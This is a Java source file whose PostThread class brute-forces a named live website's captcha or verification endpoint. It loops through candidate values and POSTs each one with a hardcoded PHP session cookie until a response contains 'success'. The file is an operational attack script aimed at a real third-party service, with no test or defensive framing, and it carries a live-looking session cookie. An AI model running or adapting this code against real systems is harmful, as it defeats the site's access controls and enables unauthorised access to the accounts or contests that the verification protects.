package validate;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;

import java.util.Stack;
import java.util.concurrent.Callable;

import static validate.HttpAsk.p;


/**
 * Created by zhengjiarong on 2017/7/15.
 */
public class PostThread implements Callable {
    public static Boolean flag=false;
    public String[] stack;
    public HttpClient httpClient = new HttpClient();
    public static Integer count=0;
    public String name;
    public PostThread(String _name,String[] _stack){
        stack=_stack;
        name=_name;
    }
    public Object call() throws Exception {
        Integer i=0;
        while(!flag&&i<stack.length){
            String password=stack[i];
            try {
                PostMethod postMethod=getPostMethod(password);
                httpClient.executeMethod(postMethod);
                String body=postMethod.getResponseBodyAsString();
                count++;
                p(count+":"+name+"-"+password);
                if(body.contains("success")){
                    flag=true;
                    break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            i++;
        }
        return null;
    }
    public static PostMethod getPostMethod(String pa){
        String url="http://mmdasai.cnweike.cn/index.php?r=matchV3/user/ajaxVerifyCaptcha";
        PostMethod postMethod=new PostMethod(url);
        postMethod.addParameter("captcha",pa);
        postMethod.setRequestHeader("X-Requested-With","XMLHttpRequest");
        postMethod.setRequestHeader("Cookie","PHPSESSID=pdkbqr6uur9p970sgm1mnv43i3; Hm_lvt_a52e134d83e9d7feb542179119d6fe16=1500085471; Hm_lpvt_a52e134d83e9d7feb542179119d6fe16=1500090155");
        return postMethod;
    }
    public static void p(String s){
        System.out.println(s);
    }
}
